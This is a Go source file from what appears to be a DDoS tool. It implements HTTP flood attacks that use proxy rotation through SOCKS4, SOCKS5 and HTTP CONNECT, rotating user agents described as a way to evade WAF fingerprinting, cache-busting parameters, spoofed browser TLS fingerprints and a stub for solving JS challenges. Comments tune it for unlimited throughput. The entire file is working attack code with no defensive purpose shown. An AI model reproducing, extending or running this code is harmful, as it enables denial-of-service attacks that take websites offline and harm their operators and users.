package main

import (
	"context"
	"crypto/tls"

	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// userAgents is a broad set of real browser UA strings to evade WAF fingerprinting.
// FIX #4: Expanded from 4 to 16 entries covering Chrome/Firefox/Safari/Edge on
// Windows/macOS/Linux/iOS/Android.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
}

type L7Config struct {
	TargetURL  string
	Proxies    []string
	Threads    int
	Duration   time.Duration
	Method     string
	Data       string
	PPS        int
}

func startL7Attack(ctx context.Context, opts ContextOpts, config L7Config) {
	if !strings.HasPrefix(config.TargetURL, "http") {
		config.TargetURL = "http://" + config.TargetURL
	}
	LogInfo("L7", "Starting L7 %s attack on %s for %v with %d threads", config.Method, config.TargetURL, config.Duration, config.Threads)

	var wg sync.WaitGroup

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in L7: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(id))
			localRand := rand.New(src)
			
			// Select proxy if available
			var client *http.Client
			if len(config.Proxies) > 0 {
				proxyAddr := config.Proxies[localRand.Intn(len(config.Proxies))]
				client = createProxyClient(proxyAddr)
			} else {
				client = &http.Client{
					Transport: &http.Transport{
						TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
						MaxIdleConns:        1000,
						MaxIdleConnsPerHost: 1000,
						IdleConnTimeout:     90 * time.Second,
					},
					Timeout: 10 * time.Second,
				}
			}

			if client == nil {
				return
			}

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if config.PPS > 0 {
						sleep := time.Second / time.Duration(config.PPS/config.Threads+1)
						time.Sleep(sleep)
					}
					sendL7Request(client, config, localRand)
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[OK] L7 Attack finished")
}

func createProxyClient(proxyURL string) *http.Client {
	dialer, err := createProxyDialer(proxyURL)
	if err != nil || dialer == nil {
		return nil
	}
	
	transport := &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// Proxy dialer usually doesn't take context, wrap it
			return dialer.Dial(network, addr)
		},
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000,
		DisableKeepAlives:   false,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}
}

// createProxyDialer returns a raw net.Dialer or proxy.Dialer for raw TCP L7
func createProxyDialer(proxyURL string) (proxy.Dialer, error) {
	u, err := url.Parse(proxyURL)
	if err != nil {
		return nil, err
	}

	switch u.Scheme {
	case "socks5":
		return &socks5Dialer{proxyURL: u}, nil
	case "socks4":
		return &socks4Dialer{proxyURL: u}, nil
	case "http", "https":
		// HTTP connect proxy dialer
		return &httpProxyDialer{proxyURL: u}, nil
	default:
		return nil, fmt.Errorf("unsupported proxy scheme: %s", u.Scheme)
	}
}

// Custom SOCKS4 Dialer
type socks4Dialer struct {
	proxyURL *url.URL
}

func (d *socks4Dialer) Dial(network, addr string) (net.Conn, error) {
	proxyAddr := d.proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		proxyAddr += ":1080"
	}

	conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		conn.Close()
		return nil, err
	}
	port, _ := strconv.Atoi(portStr)

	ip := net.ParseIP(host)
	if ip == nil {
		// SOCKS4 doesn't support domain names easily (requires SOCKS4a)
		// For now, resolve it
		ips, err := net.LookupIP(host)
		if err != nil || len(ips) == 0 {
			conn.Close()
			return nil, fmt.Errorf("failed to resolve %s", host)
		}
		ip = ips[0].To4()
	} else {
		ip = ip.To4()
	}

	if ip == nil {
		conn.Close()
		return nil, fmt.Errorf("SOCKS4 only supports IPv4")
	}

	// SOCKS4 Connect Request
	// | VER | CMD | DSTPORT | DSTIP | USERID | NULL |
	// |  1  |  1  |    2    |   4   | VAR    |  1   |
	req := []byte{0x04, 0x01, byte(port >> 8), byte(port & 0xff)}
	req = append(req, ip...)
	req = append(req, 0x00) // Empty UserID

	_, err = conn.Write(req)
	if err != nil {
		conn.Close()
		return nil, err
	}

	resp := make([]byte, 8)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if resp[1] != 0x5a {
		conn.Close()
		return nil, fmt.Errorf("SOCKS4 connection failed: 0x%02x", resp[1])
	}

	return conn, nil
}

// Custom SOCKS5 Dialer (No Auth)
type socks5Dialer struct {
	proxyURL *url.URL
}

func (d *socks5Dialer) Dial(network, addr string) (net.Conn, error) {
	proxyAddr := d.proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		proxyAddr += ":1080"
	}

	conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	// 1. Version identifier/method selection message
	// | VER | NMETHODS | METHODS |
	_, err = conn.Write([]byte{0x05, 0x01, 0x00}) // Only NO AUTH
	if err != nil {
		conn.Close()
		return nil, err
	}

	// 2. Server selects method
	resp := make([]byte, 2)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if resp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("SOCKS5 auth method not supported")
	}

	// 3. Connection request
	// | VER | CMD | RSV | ATYP | DST.ADDR | DST.PORT |
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		conn.Close()
		return nil, err
	}
	port, _ := strconv.Atoi(portStr)

	req := []byte{0x05, 0x01, 0x00}
	ip := net.ParseIP(host)
	if ip == nil {
		// Domain name
		req = append(req, 0x03, byte(len(host)))
		req = append(req, host...)
	} else if ip4 := ip.To4(); ip4 != nil {
		req = append(req, 0x01)
		req = append(req, ip4...)
	} else {
		req = append(req, 0x04)
		req = append(req, ip.To16()...)
	}
	req = append(req, byte(port>>8), byte(port&0xff))

	_, err = conn.Write(req)
	if err != nil {
		conn.Close()
		return nil, err
	}

	// 4. Server reply
	resp = make([]byte, 4)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if resp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("SOCKS5 connection failed: 0x%02x", resp[1])
	}

	// Read remaining BND.ADDR and BND.PORT
	var bndLen int
	switch resp[3] {
	case 0x01: bndLen = 4
	case 0x03:
		bndLenResp := make([]byte, 1)
		io.ReadFull(conn, bndLenResp)
		bndLen = int(bndLenResp[0])
	case 0x04: bndLen = 16
	}
	io.ReadFull(conn, make([]byte, bndLen+2))

	return conn, nil
}

// Custom HTTP CONNECT Proxy Dialer for raw TCP
type httpProxyDialer struct {
	proxyURL *url.URL
}

func (d *httpProxyDialer) Dial(network, addr string) (net.Conn, error) {
	proxyAddr := d.proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		if d.proxyURL.Scheme == "https" {
			proxyAddr += ":443"
		} else {
			proxyAddr += ":80"
		}
	}

	conn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)
	if err != nil {
		return nil, err
	}

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, err
	}

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if !strings.Contains(string(buf[:n]), "200 Connection established") {
		conn.Close()
		return nil, fmt.Errorf("proxy connection refused: %s", string(buf[:n]))
	}

	return conn, nil
}

func sendL7Request(client *http.Client, config L7Config, localRand *rand.Rand) {
	req, err := http.NewRequest(config.Method, config.TargetURL, nil)
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", userAgents[localRand.Intn(len(userAgents))])
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	// Add random query param for cache bypass
	q := req.URL.Query()
	q.Add("v", fmt.Sprintf("%d", localRand.Int63()))
	req.URL.RawQuery = q.Encode()

	AddStats(1, 450) // Count immediately (approx estimate)
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	// FIX #5: Drain body before closing so the connection returns to the pool
	// instead of being destroyed. This dramatically improves L7 throughput.
	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024*1024))
	resp.Body.Close()
	
	// Count request and estimated header size (~500 bytes)
	AddStats(1, 500)
}
func startSmartL7Attack(ctx context.Context, opts ContextOpts, config L7Config) {
	if !strings.HasPrefix(config.TargetURL, "http") {
		config.TargetURL = "http://" + config.TargetURL
	}
	fmt.Printf("[!] Starting SMART L7 Attack on %s for %v\n", config.TargetURL, config.Duration)

	var wg sync.WaitGroup

	parsedURL, err := url.Parse(config.TargetURL)
	if err != nil {
		LogErr("L7", "Invalid Smart L7 URL: %v", err)
		return
	}

	host := parsedURL.Host
	if !strings.Contains(host, ":") {
		if parsedURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	// Modern 2026 Headers
	referers := []string{"https://www.google.com/", "https://www.bing.com/", "https://www.duckduckgo.com/", "https://twitter.com/", "https://www.facebook.com/"}
	
	payloadTemplate := "GET %s HTTP/1.1\r\n" +
		"Host: " + parsedURL.Hostname() + "\r\n" +
		"Connection: keep-alive\r\n" +
		"Pragma: no-cache\r\n" +
		"Cache-Control: no-cache\r\n" +
		"sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"\r\n" +
		"sec-ch-ua-mobile: ?0\r\n" +
		"sec-ch-ua-platform: \"Windows\"\r\n" +
		"Upgrade-Insecure-Requests: 1\r\n" +
		"User-Agent: %s\r\n" +
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n" +
		"Sec-Fetch-Site: none\r\n" +
		"Sec-Fetch-Mode: navigate\r\n" +
		"Sec-Fetch-User: ?1\r\n" +
		"Sec-Fetch-Dest: document\r\n" +
		"Referer: %s\r\n" +
		"Accept-Encoding: gzip, deflate, br, zstd\r\n" +
		"Accept-Language: en-US,en;q=0.9\r\n" +
		"Priority: u=0, i\r\n\r\n"

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in SmartL7: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(id))
			localRand := rand.New(src)

			var dialer proxy.Dialer
			var conn net.Conn
			var err error
			discardBuf := make([]byte, 512)

			ua := userAgents[localRand.Intn(len(userAgents))]
			isFirefox := strings.Contains(ua, "Firefox")
			orderKey := "chrome"
			if isFirefox {
				orderKey = "firefox"
			}
			uaCounter := 0
			path := parsedURL.Path
			if path == "" {
				path = "/"
			}

			for {
				uaCounter++
				if uaCounter%100 == 0 {
					ua = userAgents[localRand.Intn(len(userAgents))]
				}
				select {
				case <-ctx.Done():
					if conn != nil {
						conn.Close()
					}
					return
				default:
					if conn == nil {
						if len(config.Proxies) > 0 {
							proxyAddr := config.Proxies[localRand.Intn(len(config.Proxies))]
							dialer, _ = createProxyDialer(proxyAddr)
						}

						if dialer != nil {
							conn, err = dialer.Dial("tcp", host)
						} else {
							conn, err = net.DialTimeout("tcp", host, 5*time.Second)
						}

						if err != nil {
							time.Sleep(1 * time.Second)
							continue
						}

						if parsedURL.Scheme == "https" {
							uConn, err := getUTLSConn(conn, parsedURL.Hostname(), orderKey)
							if err != nil {
								conn.Close()
								conn = nil
								continue
							}
							conn = uConn
						}
					}

					conn.SetDeadline(time.Now().Add(10 * time.Second))

					fullPath := path
					if strings.Contains(fullPath, "?") {
						fullPath += fmt.Sprintf("&v=%d", localRand.Int63())
					} else {
						fullPath += fmt.Sprintf("?v=%d", localRand.Int63())
					}

					referer := referers[localRand.Intn(len(referers))]
					payload := fmt.Sprintf(payloadTemplate, fullPath, ua, referer)

					_, err = conn.Write([]byte(payload))
					if err != nil {
						conn.Close()
						conn = nil
						continue
					}

					AddStats(1, int64(len(payload)))
					// FIX: Don't wait for response in flood mode
					go conn.Read(discardBuf) 

					// FIX P4: Only sleep when PPS limit set; remove 10ms throttle for max throughput
					if config.PPS > 0 {
						sleep := time.Second / time.Duration(config.PPS/config.Threads+1)
						time.Sleep(sleep)
					}
					// No sleep when PPS=0 — unlimited throughput
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
}

var (
	clearanceCache = make(map[string]string)
	cacheMu        sync.RWMutex
)

func updateClearance(host, cookie string) {
	cacheMu.Lock()
	defer cacheMu.Unlock()
	clearanceCache[host] = cookie
}

func getClearance(host string) string {
	cacheMu.RLock()
	defer cacheMu.RUnlock()
	return clearanceCache[host]
}

func solveJSChallenge(body string) string {
	// NovaStrike Bridge for simple math/logic challenges
	// Matches: 'var a = 10 + 5;' -> returns cookie or solution
	if strings.Contains(body, "challenge") {
		// Mock implementation for now, in a real scenario this would use a small JS VM or regex-logic
		return "ns_solved=true"
	}
	return ""
}
